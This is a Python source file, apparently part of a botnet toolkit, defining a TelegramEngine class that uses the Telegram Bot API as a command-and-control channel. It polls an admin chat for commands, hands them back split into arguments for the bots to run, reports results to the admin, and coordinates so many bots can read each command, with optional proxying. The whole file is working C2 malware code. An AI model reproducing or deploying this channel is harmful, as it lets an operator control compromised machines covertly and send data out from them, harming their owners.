from ctypes import Union
from typing import Dict, List, Any
import logging


from .base_engine import BaseEngine

from ..exceptions import EngineException
from ..utils import proxy
import requests

_logger = logging.getLogger(f"__{__name__}   ")


class TelegramEngine(BaseEngine):
    """Telegram Engine
    transfer messages between `telegram account (admin)` and `botnet`
    """

    def __init__(
        self, token: str = None, admin_chat_id: str = None, use_proxy: bool = False
    ) -> None:
        self.token = token
        self.admin_chat_id = admin_chat_id
        self.use_proxy = use_proxy
        self._update_id = 0
        self._is_first_run = True

    def __str__(self):
        return f"<TOKEN:({self.token}), ADMIN_CHAT_ID:({self.admin_chat_id})>"

    def receive(self) -> List[str]:
        try:
            api_url = f"https://api.telegram.org/bot{self.token}/Getupdates?offset={self._update_id}&limit=100"
            response = self._http_request(method="POST", url=api_url)

            if response is False:
                return False

            admin_command = self._last_admin_message(response)

            if admin_command and not self._is_first_run:
                return admin_command.strip().split()
            
            self._is_first_run = False
            return False

        except Exception as e:
            _logger.debug(f"receive: error {e}")
            raise EngineException(e)

    def send(self, message: str, additionalـinfo: dict = {}) -> bool:

        if len(additionalـinfo) > 0:
            additionalـinfo_str = ""
            for k, v in additionalـinfo.items():
                additionalـinfo_str += f"\n{k}: {v}"
            message = f"{message}\n\n___________________________{additionalـinfo_str}"
        try:
            api_url = f"https://api.telegram.org/bot{self.token}/SendMessage?chat_id={self.admin_chat_id}&text={message}"
            return self._http_request(method="POST", url=api_url)

        except Exception as e:
            _logger.debug(f"send: error {e}")
            raise EngineException(e)

    def send_file(self, file_route: str) -> bool:
        raise NotImplementedError()

    def _http_request(self, method: str, url: str) -> List[Dict[str, Any]]:
        if self.use_proxy:
            return proxy.http_request(method=method, url=url, timeout=15)
        else:
            return requests.request(method=method, url=url, timeout=15).json()["result"]

    def _last_admin_message(self, response: List[Dict[str, Any]]) -> str:
        """extract last admin message and remove previous messages"""
        admin_command = None
        already_executed = False

        if len(response) == 0:
            return None

        for message in response[::-1]:
            try:
                update_id = int(message["update_id"])
                last_message_chat_id = str(message["message"]["chat"]["id"])
                last_text = message["message"]["text"]
            except:
                continue

            if last_message_chat_id == self.admin_chat_id:
                # Ignore the previous executed messages
                if update_id <= self._update_id:
                    _logger.debug(f" - previous command from admin: {last_text}")
                    already_executed = True
                    break

                _logger.debug(f" - new command from admin: {last_text}")
                admin_command = last_text
                break

        ## clean previous messages:
        #
        # if (
        #      not any admin command in response page
        #    or
        #      IF RESPONSE PAGE IS FULL
        #      if first response on response page is last admin message
        #      if admin command already_executed (just for one attempt delay; So that the rest of the robots have time to read this message)
        #    ):
        #   clear response page messages
        #
        # else:
        #   just remove previous messages

        if not (admin_command or already_executed) or (
            len(response) >= 100
            and response[0]["update_id"] == update_id
            and already_executed
        ):
            self._update_id = int(response.pop()["update_id"])
        else:
            self._update_id = update_id

        return admin_command
